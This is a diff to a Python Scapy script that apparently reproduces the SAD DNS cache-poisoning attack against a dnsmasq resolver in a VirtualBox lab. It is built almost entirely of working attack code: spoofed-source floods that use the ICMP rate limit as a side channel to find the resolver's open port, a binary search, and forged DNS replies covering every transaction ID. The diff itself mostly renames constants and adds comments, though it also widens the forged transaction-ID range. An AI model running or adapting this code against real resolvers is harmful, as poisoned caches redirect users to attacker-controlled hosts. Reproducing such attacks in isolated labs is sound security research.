@@ -1,7 +1,7 @@
 from scapy.all import *
 
-import socket
 import random
+import socket
 import struct
 
 # IP Address of Recursive Resolver
@@ -16,11 +16,11 @@ forwarder_port = 53
 global_socket = conf.L2socket(iface='vbox_saddns_net')
 
 # Constant, icmp limit used for side channel. This number relies on kernel version used.
-ICMP_limit_rate = 100
+ICMP_LIMIT_RATE = 100
 # How long we wait for reeponse that port is unreachable
-ICMP_reply_wait_time = .1
+ICMP_REPLY_WAIT_TIME = .1
 
-# Range of Ports
+# Range of Ports to Scan
 min_port_scans = 1024
 max_port_scans = 65535
 
@@ -34,6 +34,7 @@ raw_dns_replies = None
 header = None
 
 def dns_query():
+    '''Craft simple DNS query to initiate attack.'''
     my_ip = '192.168.1.240'
     my_port = 9999
     ip_layer = IP(dst=forwarder_ip, src=my_ip)
@@ -53,7 +54,7 @@ def flood(port_start, number_of_padding_packet):
     now_port = port_start
     probe_packet = []
     
-    for i in range(ICMP_limit_rate):
+    for i in range(ICMP_LIMIT_RATE):
         ip_layer = IP(dst=forwarder_ip, src=nameserver_ip)
         udp_layer = UDP(dport=now_port, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
@@ -67,7 +68,7 @@ def flood(port_start, number_of_padding_packet):
     for packet in probe_packet:
         global_socket.send(packet)
 
-    reply = global_socket.sr1(verification_packet, timeout=ICMP_reply_wait_time)
+    reply = global_socket.sr1(verification_packet, timeout=ICMP_REPLY_WAIT_TIME)
     # no open port
     if reply == None:
         return -1
@@ -80,15 +81,15 @@ def flood(port_start, number_of_padding_packet):
 def binary_search(left, right):
     mid = left + (right - left) // 2
     if left == right:
-        return flood(left, ICMP_limit_rate - 1)
+        return flood(left, ICMP_LIMIT_RATE - 1)
 
     # find open port on left
-    ret1 = flood(left, ICMP_limit_rate - (mid - left + 1))
+    ret1 = flood(left, ICMP_LIMIT_RATE - (mid - left + 1))
     if ret1 == left:
         return binary_search(left, mid)
 
     # no open port on left, continue to right
-    ret2 = flood(mid + 1, ICMP_limit_rate - (right - mid))
+    ret2 = flood(mid + 1, ICMP_LIMIT_RATE - (right - mid))
     if ret2 == mid + 1:
         return binary_search(mid + 1, right)
 
@@ -97,7 +98,7 @@ def binary_search(left, right):
 
 def prepare_dns_replies(port):
     dns_replies = []
-    for txid in range(1024, 65536):
+    for txid in range(0, 65536):
         dns_replies.append(
             Ether()
             / IP(dst=forwarder_ip, src=nameserver_ip)
@@ -138,7 +139,6 @@ def forge_DNS_response(actual_port):
     return True
 
 def main():
-
     # run dns_query() on victim with dnsmasq installed and IP configured
 
     # run main() on attacker
@@ -148,16 +148,16 @@ def main():
     start_port = min_port_scans
 
     while finished == 0:
-        while min_port_scans + ICMP_limit_rate <= max_port_scans:
+        while min_port_scans + ICMP_LIMIT_RATE <= max_port_scans:
             ret = flood(start, 0)
             if ret > 0:
-                port = binary_search(start_port, start_port + ICMP_limit_rate - 1)
+                port = binary_search(start_port, start_port + ICMP_LIMIT_RATE - 1)
                 if port > 0:
                     result = forge_DNS_response(port)
                     if result == True:
                         finished = 1
                         return
-            start += ICMP_limit_rate
+            start += ICMP_LIMIT_RATE
 
     # To view cache, run "cat /var/lib/misc/dnsmasq.leases" on victim
 
